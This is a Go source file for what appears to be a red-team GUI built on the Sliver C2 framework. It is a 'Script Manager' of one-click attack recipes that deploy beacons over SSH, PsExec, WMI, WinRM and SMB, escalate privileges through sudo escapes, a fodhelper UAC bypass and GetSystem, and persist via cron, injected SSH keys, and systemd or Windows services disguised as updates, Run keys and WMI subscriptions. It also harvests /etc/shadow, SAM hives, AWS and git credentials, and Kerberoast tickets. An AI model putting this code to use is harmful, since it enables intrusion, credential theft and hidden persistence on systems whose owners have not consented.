package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// scripts.go implements "Script Manager" — one-click lateral movement,
// privilege escalation, and persistence recipes (like Cobalt Strike's
// jump/spawn/remote-exec commands).
//
// All methods are bound to the frontend via Wails and appear in the
// Script Manager panel.

// ─── Result types ─────────────────────────────────────────────────────────────

type ScriptResult struct {
	Success bool   `json:"success"`
	Output  string `json:"output"`
	Error   string `json:"error,omitempty"`
}

// ─── Lateral Movement ─────────────────────────────────────────────────────────

// ScriptSSHDeploy deploys a beacon on a remote host via SSH from an active session.
// Equivalent to: upload beacon to pivot host → serve via python http → ssh wget + exec.
// This is the "jump ssh" equivalent.
func (a *App) ScriptSSHDeploy(sessionID, targetHost string, targetPort int, user, pass, beaconPath string) ScriptResult {
	client, err := a.requireClient()
	if err != nil {
		return ScriptResult{Error: err.Error()}
	}
	if targetPort == 0 {
		targetPort = 22
	}
	a.audit.log("script-ssh-deploy", sessionID, fmt.Sprintf("%s@%s:%d", user, targetHost, targetPort))

	// Step 1: Read the beacon file locally
	beaconData, err := readLocalFile(beaconPath)
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("cannot read beacon file: %v", err)}
	}

	// Step 2: Upload beacon to the pivot session's /tmp
	remotePath := fmt.Sprintf("/tmp/.deploy_%d", time.Now().UnixNano()%100000)
	_, err = client.RPC.Upload(a.ctx, &sliverpb.UploadReq{
		Path:    remotePath,
		Data:    beaconData,
		IsIOC:   false,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("upload to pivot failed: %v", err)}
	}

	// Step 3: Make it executable
	if _, cerr := client.RPC.Chmod(a.ctx, &sliverpb.ChmodReq{
		Path:     remotePath,
		FileMode: "0755",
		Request:  &commonpb.Request{SessionID: sessionID},
	}); cerr != nil {
		return ScriptResult{Error: fmt.Sprintf("chmod failed: %v", cerr)}
	}

	// Step 4: Start HTTP server on pivot to serve the beacon (random port,
	// interpreter-agnostic).
	httpPort := pivotHTTPPort()

	// Use shell exec to start the http server on the pivot
	_, _ = a.executeShellCmd(sessionID, pivotServeCmd(httpPort))
	time.Sleep(2 * time.Second)

	// Step 5: SSH to target and download + execute
	fileName := fmt.Sprintf(".deploy_%d", time.Now().UnixNano()%100000)
	pivotIP, iperr := a.getPivotInternalIP(sessionID)
	if iperr != nil {
		return ScriptResult{Error: fmt.Sprintf("cannot determine pivot IP: %v", iperr)}
	}
	downloadCmd := fmt.Sprintf("wget -q http://%s:%d/%s -O /tmp/%s", pivotIP, httpPort, filepath_Base(remotePath), fileName)
	chmodCmd := fmt.Sprintf("chmod +x /tmp/%s", fileName)
	execCmd := fmt.Sprintf("/tmp/%s &", fileName)

	// Execute via SSH from the implant
	resp1, err1 := client.RPC.RunSSHCommand(a.ctx, &sliverpb.SSHCommandReq{
		Username: user,
		Hostname: targetHost,
		Port:     uint32(targetPort),
		Password: pass,
		Command:  downloadCmd,
		Request:  &commonpb.Request{SessionID: sessionID},
	})

	resp2, err2 := client.RPC.RunSSHCommand(a.ctx, &sliverpb.SSHCommandReq{
		Username: user,
		Hostname: targetHost,
		Port:     uint32(targetPort),
		Password: pass,
		Command:  chmodCmd,
		Request:  &commonpb.Request{SessionID: sessionID},
	})

	resp3, err := client.RPC.RunSSHCommand(a.ctx, &sliverpb.SSHCommandReq{
		Username: user,
		Hostname: targetHost,
		Port:     uint32(targetPort),
		Password: pass,
		Command:  execCmd,
		Request:  &commonpb.Request{SessionID: sessionID},
	})

	output := ""
	if err1 != nil {
		output += fmt.Sprintf("[!] download step failed: %v\n", err1)
	} else if resp1 != nil {
		output += resp1.StdOut + resp1.StdErr
	}
	if err2 != nil {
		output += fmt.Sprintf("[!] chmod step failed: %v\n", err2)
	} else if resp2 != nil {
		output += resp2.StdOut + resp2.StdErr
	}
	if resp3 != nil {
		output += resp3.StdOut + resp3.StdErr
	}
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("ssh exec failed: %v", err), Output: output}
	}

	return ScriptResult{
		Success: true,
		Output:  fmt.Sprintf("Beacon deployed on %s@%s via SSH\n%s", user, targetHost, output),
	}
}

// ScriptSSHExecSimple runs a single command on a target via SSH from the pivot session.
func (a *App) ScriptSSHExecSimple(sessionID, targetHost string, targetPort int, user, pass, command string) ScriptResult {
	client, err := a.requireClient()
	if err != nil {
		return ScriptResult{Error: err.Error()}
	}
	if targetPort == 0 {
		targetPort = 22
	}
	a.audit.log("script-ssh-exec", sessionID, fmt.Sprintf("%s@%s:%d %s", user, targetHost, targetPort, command))

	resp, err := client.RPC.RunSSHCommand(a.ctx, &sliverpb.SSHCommandReq{
		Username: user,
		Hostname: targetHost,
		Port:     uint32(targetPort),
		Password: pass,
		Command:  command,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ScriptResult{Error: err.Error()}
	}
	output := resp.StdOut
	if resp.StdErr != "" {
		output += "\n" + resp.StdErr
	}
	return ScriptResult{Success: true, Output: output}
}

// ScriptSSHCheck verifies SSH connectivity to a target host from the pivot.
func (a *App) ScriptSSHCheck(sessionID, targetHost string, targetPort int, user, pass string) ScriptResult {
	client, err := a.requireClient()
	if err != nil {
		return ScriptResult{Error: err.Error()}
	}
	if targetPort == 0 {
		targetPort = 22
	}
	a.audit.log("script-ssh-check", sessionID, fmt.Sprintf("%s@%s:%d", user, targetHost, targetPort))

	// Use the implant's ssh command to check connectivity first
	resp, err := client.RPC.RunSSHCommand(a.ctx, &sliverpb.SSHCommandReq{
		Username: user,
		Hostname: targetHost,
		Port:     uint32(targetPort),
		Password: pass,
		Command:  "id",
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("cannot SSH to %s: %v", targetHost, err)}
	}
	if resp.StdErr != "" && !strings.Contains(resp.StdOut, "uid=") {
		return ScriptResult{Error: fmt.Sprintf("SSH auth failed: %s", resp.StdErr)}
	}

	return ScriptResult{
		Success: true,
		Output:  fmt.Sprintf("SSH connectivity confirmed to %s@%s\nResponse: %s\nUse SSH Deploy or Spawn Linux with a beacon path/listener to deploy an agent.", user, targetHost, resp.StdOut),
	}
}

// ─── Privilege Escalation Scripts ─────────────────────────────────────────────

// ScriptPrivescCheck runs common privilege escalation checks on the target.
func (a *App) ScriptPrivescCheck(sessionID string) ScriptResult {
	a.audit.log("script-privesc-check", sessionID, "")

	checks := []string{
		"echo '=== Current User ===' && id",
		"echo '=== Sudo Permissions ===' && sudo -l 2>/dev/null || echo 'no sudo'",
		"echo '=== SUID Binaries ===' && find / -perm -u=s -type f 2>/dev/null | head -20",
		"echo '=== Writable /etc/crontab ===' && ls -la /etc/crontab 2>/dev/null",
		"echo '=== World-writable dirs ===' && find / -writable -type d 2>/dev/null | grep -v proc | head -10",
	}

	fullCmd := strings.Join(checks, " ; ")
	output, ferr := a.executeShellCmd(sessionID, fullCmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: output}
}

// ScriptSudoExploit attempts sudo-based privilege escalation.
func (a *App) ScriptSudoExploit(sessionID, method string) ScriptResult {
	a.audit.log("script-sudo-exploit", sessionID, method)

	var cmd string
	switch method {
	case "find":
		cmd = "sudo find / -exec /bin/bash -p \\; -quit"
	case "vim":
		cmd = "sudo vim -c ':!/bin/bash' -c ':q!'"
	case "awk":
		cmd = "sudo awk 'BEGIN {system(\"/bin/bash\")}'"
	default:
		return ScriptResult{Error: fmt.Sprintf("unknown method: %s (use: find, vim, awk)", method)}
	}

	output, ferr := a.executeShellCmd(sessionID, cmd+" -c 'id && whoami'")
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: fmt.Sprintf("Attempted: %s\nOutput: %s", cmd, output)}
}

// ─── Persistence Scripts ──────────────────────────────────────────────────────

// ScriptPersistCron adds a cron job for beacon persistence.
func (a *App) ScriptPersistCron(sessionID, cronLine string) ScriptResult {
	a.audit.log("script-persist-cron", sessionID, cronLine)

	if cronLine == "" {
		cronLine = "*/10 * * * * root /tmp/.svc"
	}
	cmd := fmt.Sprintf("echo '%s' >> /etc/crontab && echo 'Cron added'", cronLine)
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: output}
}

// ScriptPersistSSHKey injects an SSH public key for persistent access.
func (a *App) ScriptPersistSSHKey(sessionID, pubKey, targetUser string) ScriptResult {
	a.audit.log("script-persist-sshkey", sessionID, targetUser)

	if targetUser == "" {
		targetUser = "root"
	}
	homeDir := "/root"
	if targetUser != "root" {
		homeDir = "/home/" + targetUser
	}
	cmd := fmt.Sprintf("mkdir -p %s/.ssh && echo '%s' >> %s/.ssh/authorized_keys && chmod 600 %s/.ssh/authorized_keys && echo 'Key injected'", homeDir, pubKey, homeDir, homeDir)
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: output}
}

// ScriptPersistSystemd creates a systemd service for persistence.
func (a *App) ScriptPersistSystemd(sessionID, serviceName, execPath string) ScriptResult {
	a.audit.log("script-persist-systemd", sessionID, serviceName)

	if serviceName == "" {
		serviceName = "system-update"
	}
	if execPath == "" {
		execPath = "/tmp/.svc"
	}

	unit := fmt.Sprintf(`[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target`, execPath)

	cmd := fmt.Sprintf("echo '%s' > /etc/systemd/system/%s.service && systemctl daemon-reload && systemctl enable %s && echo 'Service created: %s'", unit, serviceName, serviceName, serviceName)
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: output}
}

// ─── Credential Harvesting Scripts ────────────────────────────────────────────

// ScriptHarvestCreds searches for credentials on the target.
func (a *App) ScriptHarvestCreds(sessionID string) ScriptResult {
	a.audit.log("script-harvest-creds", sessionID, "")

	checks := []string{
		"echo '=== /etc/shadow ===' && cat /etc/shadow 2>/dev/null | head -20 || echo 'no access'",
		"echo '=== SSH Keys ===' && find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
		"echo '=== .bash_history ===' && find /home /root -name '.bash_history' -exec head -20 {} \\; 2>/dev/null",
		"echo '=== Environment files ===' && find / -name '.env' -o -name '*.conf' 2>/dev/null | head -10",
		"echo '=== Git credentials ===' && find / -name '.git-credentials' -exec cat {} \\; 2>/dev/null",
		"echo '=== AWS credentials ===' && find / -name 'credentials' -path '*/.aws/*' -exec cat {} \\; 2>/dev/null",
	}

	fullCmd := strings.Join(checks, " ; ")
	output, ferr := a.executeShellCmd(sessionID, fullCmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	lootMsg := a.saveHarvestToLoot(sessionID, "linux", output)
	return ScriptResult{Success: true, Output: output + lootMsg}
}

// ─── Network Enumeration Scripts ──────────────────────────────────────────────

// ScriptNetworkScan does a quick port scan of a subnet from the implant.
func (a *App) ScriptNetworkScan(sessionID, subnet string, ports string) ScriptResult {
	a.audit.log("script-network-scan", sessionID, subnet)

	if subnet == "" {
		subnet = "192.168.50"
	}
	if ports == "" {
		ports = "22 80 443 445 3306 2375 3000 8080"
	}

	portList := strings.Fields(ports)
	var scanCmds []string
	for _, port := range portList {
		scanCmds = append(scanCmds, fmt.Sprintf(
			"for ip in $(seq 1 254); do (echo >/dev/tcp/%s.$ip/%s 2>/dev/null && echo \"%s.$ip:%s OPEN\") & done",
			subnet, port, subnet, port))
	}
	scanCmds = append(scanCmds, "wait")

	fullCmd := strings.Join(scanCmds, " ; ")
	output, ferr := a.executeShellCmd(sessionID, fullCmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: output}
}

// ─── Windows Lateral Movement ─────────────────────────────────────────────────

// ScriptPsExec creates a remote service to execute a beacon (like Impacket psexec).
func (a *App) ScriptPsExec(sessionID, targetHost string, targetPort int, user, pass, beaconPath string) ScriptResult {
	a.audit.log("script-psexec", sessionID, targetHost)
	// PsExec via shell: copy binary to admin share then create+start service
	cmds := []string{
		fmt.Sprintf(`net use \\%s\C$ /user:"%s" "%s"`, targetHost, user, pass),
		fmt.Sprintf(`copy /Y "%s" \\%s\C$\Windows\Temp\svc.exe`, beaconPath, targetHost),
		fmt.Sprintf(`sc \\%s create SliverSvc binpath= "C:\Windows\Temp\svc.exe" start= auto`, targetHost),
		fmt.Sprintf(`sc \\%s start SliverSvc`, targetHost),
	}
	cmd := strings.Join(cmds, " & ")
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: fmt.Sprintf("PsExec to %s:\n%s", targetHost, output)}
}

// ScriptWMIExec runs a command via WMI on a remote Windows host.
func (a *App) ScriptWMIExec(sessionID, targetHost string, targetPort int, user, pass, command string) ScriptResult {
	a.audit.log("script-wmi-exec", sessionID, targetHost)
	if command == "" {
		command = "whoami"
	}
	cmd := fmt.Sprintf(`wmic /node:"%s" /user:"%s" /password:"%s" process call create "%s"`, targetHost, user, pass, command)
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: fmt.Sprintf("WMI Exec on %s:\n%s", targetHost, output)}
}

// ScriptWinRMExec runs a command via WinRM (PowerShell Remoting).
func (a *App) ScriptWinRMExec(sessionID, targetHost string, targetPort int, user, pass, command string) ScriptResult {
	a.audit.log("script-winrm-exec", sessionID, targetHost)
	if command == "" {
		command = "whoami; hostname"
	}
	psScript := fmt.Sprintf(`Set-Item WSMan:\localhost\Client\TrustedHosts -Value '%s' -Force -ErrorAction SilentlyContinue; $sec = ConvertTo-SecureString '%s' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('%s', $sec); Invoke-Command -ComputerName '%s' -Credential $cred -ScriptBlock { %s }`, targetHost, pass, user, targetHost, command)

	// Encode to UTF-16LE base64 for powershell -EncodedCommand
	var utf16 []byte
	for _, r := range psScript {
		utf16 = append(utf16, byte(r), byte(r>>8))
	}
	encoded := base64.StdEncoding.EncodeToString(utf16)

	cmd := fmt.Sprintf("powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand %s", encoded)
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: fmt.Sprintf("WinRM on %s:\n%s", targetHost, output)}
}

// ScriptSCDeploy creates and starts a remote service.
func (a *App) ScriptSCDeploy(sessionID, targetHost string, targetPort int, user, pass, beaconPath string) ScriptResult {
	a.audit.log("script-sc-deploy", sessionID, targetHost)
	svcName := fmt.Sprintf("Svc%d", time.Now().UnixNano()%10000)
	cmds := []string{
		fmt.Sprintf(`sc \\%s create %s binpath= "%s" start= auto`, targetHost, svcName, beaconPath),
		fmt.Sprintf(`sc \\%s start %s`, targetHost, svcName),
	}
	cmd := strings.Join(cmds, " & ")
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: fmt.Sprintf("Service %s on %s:\n%s", svcName, targetHost, output)}
}

// ScriptSMBUploadExec copies a beacon via SMB C$ share then executes it.
func (a *App) ScriptSMBUploadExec(sessionID, targetHost string, targetPort int, user, pass, beaconPath string) ScriptResult {
	a.audit.log("script-smb-upload", sessionID, targetHost)
	remotePath := `C:\Windows\Temp\update.exe`
	cmds := []string{
		fmt.Sprintf(`net use \\%s\C$ "%s" /user:%s`, targetHost, pass, user),
		fmt.Sprintf(`copy /Y "%s" "\\%s\C$\Windows\Temp\update.exe"`, beaconPath, targetHost),
		fmt.Sprintf(`wmic /node:"%s" /user:"%s" /password:"%s" process call create "%s"`, targetHost, user, pass, remotePath),
	}
	cmd := strings.Join(cmds, " & ")
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: fmt.Sprintf("SMB+Exec to %s:\n%s", targetHost, output)}
}

// ─── Windows Privilege Escalation ─────────────────────────────────────────────

// ScriptWinPrivescCheck enumerates common Windows privesc vectors.
func (a *App) ScriptWinPrivescCheck(sessionID string) ScriptResult {
	a.audit.log("script-win-privesc", sessionID, "")
	checks := []string{
		`echo === WHOAMI === & whoami /priv`,
		`echo === AlwaysInstallElevated === & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul & reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul`,
		`echo === Unquoted Service Paths === & wmic service get name,pathname,startmode 2>nul | findstr /i /v "C:\Windows" | findstr /i /v """`,
		`echo === Weak Service Permissions === & sc query state= all 2>nul | findstr SERVICE_NAME`,
		`echo === AutoLogon === & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>nul`,
		`echo === Scheduled Tasks === & schtasks /query /fo LIST /v 2>nul | findstr /i "Task To Run\|Run As User"`,
	}
	cmd := strings.Join(checks, " & ")
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: output}
}

// ScriptTokenImpersonate lists available tokens and attempts impersonation.
func (a *App) ScriptTokenImpersonate(sessionID, targetUser string) ScriptResult {
	a.audit.log("script-token-impersonate", sessionID, targetUser)
	// Uses Sliver's built-in impersonate RPC
	client, err := a.requireClient()
	if err != nil {
		return ScriptResult{Error: err.Error()}
	}
	if targetUser == "" {
		// List available tokens via whoami + process list
		output, ferr := a.executeShellCmd(sessionID, `whoami /all & echo === PROCESSES === & tasklist /V 2>nul`)
		if ferr != nil {
			return ScriptResult{Error: ferr.Error(), Output: output}
		}
		return ScriptResult{Success: true, Output: "Token info:\n" + output}
	}
	_, err = client.RPC.Impersonate(a.ctx, &sliverpb.ImpersonateReq{
		Username: targetUser,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("impersonate failed: %v", err)}
	}
	return ScriptResult{Success: true, Output: fmt.Sprintf("[+] Impersonating %s", targetUser)}
}

// ScriptGetSystem attempts SYSTEM escalation.
// Uses profileConfig() to resolve the profile name into a full ImplantConfig.
func (a *App) ScriptGetSystem(sessionID, profile string) ScriptResult {
	a.audit.log("script-getsystem", sessionID, profile)
	if profile == "" {
		return ScriptResult{Error: "Provide a profile name (a saved implant profile)"}
	}
	cfg, err := a.profileConfig(profile)
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("profile lookup failed: %v", err)}
	}
	if warn := a.checkProfileListener(profile); warn != "" {
		return ScriptResult{Error: warn}
	}
	client, err := a.requireClient()
	if err != nil {
		return ScriptResult{Error: err.Error()}
	}
	_, err = client.RPC.GetSystem(a.ctx, &clientpb.GetSystemReq{
		HostingProcess: "spoolsv.exe",
		Config:         cfg,
		Request:        &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("getsystem failed: %v", err)}
	}
	a.UpdateKillChain("privesc")
	if sess, e := a.requireSession(sessionID); e == nil {
		a.AddIOC(sess.Hostname, "file", "spoolsv.exe (injected)", "GetSystem shellcode injection")
	}
	return ScriptResult{Success: true, Output: "[+] GetSystem requested. Watch for new SYSTEM session."}
}

// ScriptUACBypass attempts UAC bypass via fodhelper/eventvwr.
// Auto-stages the current session's binary to the target path if not present.
func (a *App) ScriptUACBypass(sessionID, beaconPath string) ScriptResult {
	a.audit.log("script-uac-bypass", sessionID, beaconPath)
	if beaconPath == "" {
		beaconPath = `C:\Windows\Temp\svc.exe`
	}
	sess, serr := a.requireSession(sessionID)
	if serr != nil {
		return ScriptResult{Error: serr.Error()}
	}
	// Auto-stage: copy the current implant binary to the target path
	if !a.targetFileExists(sessionID, beaconPath) {
		copyCmd := fmt.Sprintf(`powershell -Command "Copy-Item -Path (Get-Process -Id $PID).Path -Destination '%s' -Force"`, beaconPath)
		if _, err := a.executeShellCmd(sessionID, copyCmd); err != nil || !a.targetFileExists(sessionID, beaconPath) {
			return ScriptResult{Error: fmt.Sprintf("no beacon staged at %s — run 'spawn <os> <arch> <profile>' first to stage an implant, then retry UAC Bypass.", beaconPath)}
		}
	}
	cmds := []string{
		`echo === Trying fodhelper bypass === `,
		fmt.Sprintf(`reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "%s" /f`, beaconPath),
		`reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f`,
		`start fodhelper.exe`,
		`ping -n 4 127.0.0.1 >nul 2>&1`,
		`reg delete "HKCU\Software\Classes\ms-settings" /f 2>nul`,
	}
	cmd := strings.Join(cmds, " & ")
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	a.UpdateKillChain("privesc")
	a.AddIOC(sess.Hostname, "regkey", `HKCU\Software\Classes\ms-settings\Shell\Open\command`, "UAC bypass fodhelper (cleaned)")
	a.AddIOC(sess.Hostname, "file", beaconPath, "Staged implant for UAC bypass")
	return ScriptResult{Success: true, Output: output}
}

// ─── Windows Persistence ──────────────────────────────────────────────────────

// ScriptPersistRegRun adds a Registry Run key.
func (a *App) ScriptPersistRegRun(sessionID, beaconPath, name string) ScriptResult {
	a.audit.log("script-persist-reg", sessionID, name)
	if name == "" {
		name = "SecurityUpdate"
	}
	if beaconPath == "" {
		beaconPath = `C:\Windows\Temp\svc.exe`
	}
	sess, serr := a.requireSession(sessionID)
	if serr != nil {
		return ScriptResult{Error: serr.Error()}
	}
	cmd := fmt.Sprintf(`reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "%s" /t REG_SZ /d "%s" /f`, name, beaconPath)
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	a.UpdateKillChain("persistence")
	a.AddIOC(sess.Hostname, "regkey", `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\`+name, "Persist: Registry Run key")
	a.AddIOC(sess.Hostname, "file", beaconPath, "Persist: implant binary")
	return ScriptResult{Success: true, Output: fmt.Sprintf("Registry Run key added:\n%s", output)}
}

// ScriptPersistSchedTask creates a scheduled task.
func (a *App) ScriptPersistSchedTask(sessionID, beaconPath, taskName string) ScriptResult {
	a.audit.log("script-persist-schtask", sessionID, taskName)
	if taskName == "" {
		taskName = `\Microsoft\Windows\Maintenance\SecurityUpdate`
	}
	if beaconPath == "" {
		beaconPath = `C:\Windows\Temp\svc.exe`
	}
	sess, serr := a.requireSession(sessionID)
	if serr != nil {
		return ScriptResult{Error: serr.Error()}
	}
	cmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc onlogon /ru SYSTEM /f`, taskName, beaconPath)
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	a.UpdateKillChain("persistence")
	a.AddIOC(sess.Hostname, "schtask", taskName, "Persist: Scheduled task")
	a.AddIOC(sess.Hostname, "file", beaconPath, "Persist: implant binary")
	return ScriptResult{Success: true, Output: fmt.Sprintf("Scheduled task:\n%s", output)}
}

// ScriptPersistService installs a Windows service.
func (a *App) ScriptPersistService(sessionID, beaconPath, svcName string) ScriptResult {
	a.audit.log("script-persist-service", sessionID, svcName)
	if svcName == "" {
		svcName = "WinUpdateSvc"
	}
	if beaconPath == "" {
		beaconPath = `C:\Windows\Temp\svc.exe`
	}
	sess, serr := a.requireSession(sessionID)
	if serr != nil {
		return ScriptResult{Error: serr.Error()}
	}
	cmds := []string{
		fmt.Sprintf(`sc create %s binpath= "%s" start= auto`, svcName, beaconPath),
		fmt.Sprintf(`sc description %s "Windows Update Service"`, svcName),
		fmt.Sprintf(`sc start %s`, svcName),
	}
	cmd := strings.Join(cmds, " & ")
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	a.UpdateKillChain("persistence")
	a.AddIOC(sess.Hostname, "service", svcName, "Persist: Windows service")
	a.AddIOC(sess.Hostname, "file", beaconPath, "Persist: implant binary")
	return ScriptResult{Success: true, Output: fmt.Sprintf("Service %s:\n%s", svcName, output)}
}

// ScriptPersistWMI creates a WMI event subscription for persistence.
func (a *App) ScriptPersistWMI(sessionID, beaconPath string) ScriptResult {
	a.audit.log("script-persist-wmi", sessionID, "")
	if beaconPath == "" {
		beaconPath = `C:\Windows\Temp\svc.exe`
	}
	sess, serr := a.requireSession(sessionID)
	if serr != nil {
		return ScriptResult{Error: serr.Error()}
	}
	ps := fmt.Sprintf(`powershell -c "$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='SliverFilter';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'}; $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='SliverConsumer';CommandLineTemplate='%s'}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}; echo '[+] WMI subscription created'"`, beaconPath)
	output, ferr := a.executeShellCmd(sessionID, ps)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	a.UpdateKillChain("persistence")
	a.AddIOC(sess.Hostname, "file", beaconPath, "Persist: WMI event consumer binary")
	return ScriptResult{Success: true, Output: output}
}

// ScriptPersistStartup drops a beacon in the Startup folder.
func (a *App) ScriptPersistStartup(sessionID, beaconPath string) ScriptResult {
	a.audit.log("script-persist-startup", sessionID, "")
	if beaconPath == "" {
		beaconPath = `C:\Windows\Temp\svc.exe`
	}
	sess, serr := a.requireSession(sessionID)
	if serr != nil {
		return ScriptResult{Error: serr.Error()}
	}
	cmd := fmt.Sprintf(`copy /Y "%s" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"`, beaconPath)
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	a.UpdateKillChain("persistence")
	a.AddIOC(sess.Hostname, "file", `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe`, "Persist: Startup folder")
	a.AddIOC(sess.Hostname, "file", beaconPath, "Persist: implant binary")
	return ScriptResult{Success: true, Output: fmt.Sprintf("Startup folder:\n%s", output)}
}

// ─── Windows Credential Harvesting ────────────────────────────────────────────

// ScriptWinHarvestCreds enumerates Windows credentials.
func (a *App) ScriptWinHarvestCreds(sessionID string) ScriptResult {
	a.audit.log("script-win-harvest", sessionID, "")
	checks := []string{
		`echo === Cached Credentials === & cmdkey /list`,
		`echo === SAM Backup === & reg save HKLM\SAM C:\Windows\Temp\sam.bak /y 2>nul && echo SAM saved to C:\Windows\Temp\sam.bak`,
		`echo === SYSTEM Backup === & reg save HKLM\SYSTEM C:\Windows\Temp\sys.bak /y 2>nul && echo SYSTEM saved to C:\Windows\Temp\sys.bak`,
		`echo === WiFi Passwords === & netsh wlan show profiles 2>nul`,
		`echo === AutoLogon === & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "Default"`,
		`echo === DPAPI Master Keys === & dir /b C:\Users\*\AppData\Roaming\Microsoft\Protect\* 2>nul`,
		`echo === Browser Data === & dir /b /s "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data" 2>nul`,
		`echo === Unattend Files === & type C:\Windows\Panther\unattend.xml 2>nul | findstr /i "password"`,
	}
	cmd := strings.Join(checks, " & ")
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	lootMsg := a.saveHarvestToLoot(sessionID, "windows", output)
	return ScriptResult{Success: true, Output: output + lootMsg}
}

// ScriptKerberoast requests TGS tickets for offline cracking.
func (a *App) ScriptKerberoast(sessionID string) ScriptResult {
	a.audit.log("script-kerberoast", sessionID, "")
	ps := `powershell -c "Add-Type -AssemblyName System.IdentityModel; $spns = ([adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))').FindAll(); foreach($s in $spns){$u=$s.Properties['samaccountname'][0];$spn=($s.Properties['serviceprincipalname']|Select -First 1);Write-Host \"SPN: $spn ($u)\";try{$ticket=New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn;Write-Host '[+] Ticket requested'}catch{Write-Host '[-] Failed'}}"`
	output, ferr := a.executeShellCmd(sessionID, ps)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	lootMsg := a.saveHarvestToLoot(sessionID, "kerberoast", output)
	return ScriptResult{Success: true, Output: output + lootMsg}
}

// ScriptDCSync displays instructions for DCSync (requires mimikatz or impacket).
